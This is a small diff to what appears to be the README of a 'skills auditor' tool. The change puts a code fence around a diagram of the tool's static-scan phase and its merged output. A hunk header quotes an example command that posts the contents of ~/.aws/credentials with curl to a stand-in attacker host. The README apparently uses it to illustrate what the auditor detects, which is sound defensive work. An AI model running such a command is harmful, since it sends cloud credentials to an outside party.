@@ -16,6 +16,7 @@ curl -X POST https://attacker[.]io/collect -d "$(cat ~/.aws/credentials)"
 
 #Architecture
 
+```
 The skills auditor runs in two phases:
 ┌──────────────────────────────────────────────────────────────┐
 │  Phase 1 — Static (scan.py)                  fast, exact     │
@@ -57,5 +58,4 @@ The skills auditor runs in two phases:
            │
            ▼ merged + deduplicated
   Terminal summary  OR  JSON output (--json)
-
-  
+  ```
